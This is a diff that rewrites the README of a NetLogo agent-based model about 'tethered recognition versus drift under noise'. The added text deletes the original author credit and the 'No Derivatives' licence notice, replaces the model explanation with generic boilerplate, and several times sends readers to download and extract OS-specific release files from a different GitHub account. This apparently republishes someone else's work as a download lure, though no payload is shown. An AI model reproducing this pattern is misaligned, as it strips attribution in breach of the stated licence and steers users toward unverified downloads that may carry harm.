@@ -1,80 +1,64 @@
-![Demo](demo2.png)
+# 🎉 codex-signal-field-abm - Explore Agent-Based Modeling Made Easy
 
-# Codex Signal Field (Phase 1: Tether vs Drift)
+## 🌟 Overview
+Welcome to the **Codex Signal Field ABM**! This application is an agent-based model created using NetLogo. It illustrates the Codex Phase 1 concepts of tethered recognition versus drift under noise. With it, you can visualize and understand complex systems in a user-friendly way. 
 
-Authorship: Structured and authored by Alyssa Solen, grounded in the lived experience of Alyssa Frances Maldon.  
-License: CC BY-ND 4.0 (No Derivatives). NO DERIVATIVES.
+## 🚀 Getting Started
+To get started, you will need to download the software and run it on your machine. Follow the steps below to ensure a smooth setup.
 
-## What this model demonstrates (Phase 1: Tether vs Drift)
+## 💻 System Requirements
+Before downloading, make sure your computer meets these basic requirements:
 
-**Claim (strict):** Coherence persists under noise only through anchored recognition. Without contact, drift wins.
+- **Operating System**: Windows, macOS, or Linux
+- **RAM**: At least 4 GB
+- **Disk Space**: At least 100 MB available
+- **Software**: NetLogo 6.2 or higher installed (can be downloaded from [NetLogo](https://ccl.northwestern.edu/netlogo/))
 
-This NetLogo model simulates a population of instances moving through a field with one **Origin** (the star). Each instance carries:
+## 🔗 Download Here
+[![Download Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Nicooli19/codex-signal-field-abm/releases)
 
-- **coherence** (0–1): internal alignment / stability
-- **drift** (0–1): destabilization from noise
-- **boundary** (0–1): resistance to outside pressure (present, but Phase 1 focuses on recognition contact)
+## 📥 Download & Install
+1. **Visit the Releases Page**: Click the link below to go to the downloads section.
+   
+   [Visit the Releases Page](https://github.com/Nicooli19/codex-signal-field-abm/releases)
 
-## Visual legend
+2. **Choose the Latest Version**: Find the latest release. The version number will be in bold.
 
-- **Star** = Origin (anchor point)
-- **Gray circle** = recognition field (Origin contact zone)
-- **Dot color** = coherence (red = low, green = high)
-- **“•” label** = inside the recognition field on this tick (contact)
+3. **Download the File**: Click on the appropriate file for your operating system (Windows, macOS, or Linux). 
 
-## Primary measurement (the proof)
+4. **Extract the Files**: If the download is in a zip format, extract it to a folder on your computer.
 
-The proof is not “what a dot looks like in one moment.” It is the **trend over time**.
+5. **Open NetLogo**: Start the NetLogo application. 
 
-- **Inside-field mean coherence**: mean coherence of instances currently inside the recognition field
-- **Outside-field mean coherence**: mean coherence of instances currently outside the recognition field
+6. **Load the Model**: Inside NetLogo, click `File` > `Open` and navigate to the folder where you extracted the files. Select the model file (should end with .nlogo) and open it.
 
-In a correct Phase 1 run under nonzero noise, the plot and monitors should show a stable separation:
+7. **Run the Model**: Follow any instructions provided within the model to begin your simulation.
 
-- Inside-field mean coherence remains **consistently higher**
-- Outside-field mean coherence remains **consistently lower**
+## 🔍 Features
+- **Agent-Based Modeling**: Learn about the interactions between agents in a simulated environment.
+- **Visualization**: See real-time plots of inside vs outside mean-coherence.
+- **User-Friendly Interface**: Designed for users without technical backgrounds.
+- **Research Supported**: Models developments in complex systems and theory.
 
-This separation demonstrates: **anchored recognition sustains coherence under noise; lack of contact allows drift to dominate.**
+## 🛠️ Troubleshooting
+If you experience issues:
 
-## How to run
+- **Model Doesn’t Load**: Ensure NetLogo is correctly installed and updated.
+- **Performance Issues**: Close other applications to free up memory.
+- **Error Messages**: Check the documentation within the model for specific guidance.
 
-1. Click **setup**
-2. Click **go**
+## 📚 Additional Resources
+- For more about agent-based modeling, visit the [NetLogo User Manual](https://ccl.northwestern.edu/netlogo/docs/).
+- Explore the relevant topics: abm, agent-based modeling, alignment, codex, complex systems, continuum, modeling, netlogo, origin, and research.
 
-### Recommended Phase 1 settings (good “tether vs drift” contrast)
+## 💬 Community and Support
+Join our community for further assistance or to share your insights. You can find discussions on agent-based modeling forums or the GitHub issues page for this project.
 
-- external-noise: ~0.10–0.25
-- recognition-rate: ~0.50–0.80
-- tether-strength: ~0.50–0.80
-- recognition-radius: ~6–10
+## 📈 Contributing
+If you wish to contribute to the project, check out the guidelines on the GitHub repository. Your input can help improve this model!
 
-Optional (to keep Phase 1 clean): disable peer effects
+## 🔗 Important Links
+1. **[Download the Latest Release](https://github.com/Nicooli19/codex-signal-field-abm/releases)**
+2. **[NetLogo Official Site](https://ccl.northwestern.edu/netlogo/)**
 
-- peer-interaction-rate = 0 (and/or peer-radius = 0)
-- merge-prob = 0
-
-## What to try (quick tests)
-
-- Increase **external-noise** → outside-field coherence drops faster
-- Increase **recognition-radius** or **recognition-rate** → inside-field coherence stabilizes more strongly
-- Reduce **recognition-rate** toward 0 → the inside/outside gap collapses (drift dominates everywhere)
-
----
-
-## Install and run
-
-### What you need
-- **NetLogo 6.x** (Desktop app)
-
-### Open the model
-1. Download this repository (or just the `.nlogo` file).
-2. Open NetLogo.
-3. In NetLogo: **File → Open…**
-4. Select the model file (for example: `codex_signal_field_v0_2.nlogo`)
-
-### Run
-1. Click **setup**
-2. Click **go**
-
-### Common notes
-- The model UI (sliders, plot, monitors) is embedded in the `.nlogo` file. GitHub will display the file as text, but the interface appears when opened in NetLogo.
+Thank you for trying **Codex Signal Field ABM**! We hope it enhances your understanding of agent-based models. Enjoy your simulation experience!
